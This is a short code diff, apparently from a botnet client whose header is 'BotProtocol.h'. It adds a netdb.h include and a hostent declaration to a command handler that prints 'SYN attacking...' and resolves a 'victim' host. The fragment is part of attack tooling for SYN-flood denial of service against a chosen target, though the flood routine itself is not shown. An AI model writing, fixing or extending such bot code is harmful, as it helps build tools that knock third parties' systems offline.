@@ -14,6 +14,7 @@
 #include <errno.h>
 #include <sys/time.h>
 #include <fstream>
+#include <netdb.h>
 #include "BotProtocol.h"
 
 using namespace std;
@@ -123,6 +124,7 @@ void parseCommand(char command[])
     }
     else if (command[0] == '2')
     {
+        struct hostent *hostinfo = NULL; //Host name
         cout << "SYN attacking..." << endl;
         hostinfo = gethostbyname(victim);
         cout << inet_ntoa(*(struct in_addr *)*(hostinfo->h_addr_list)) << endl;
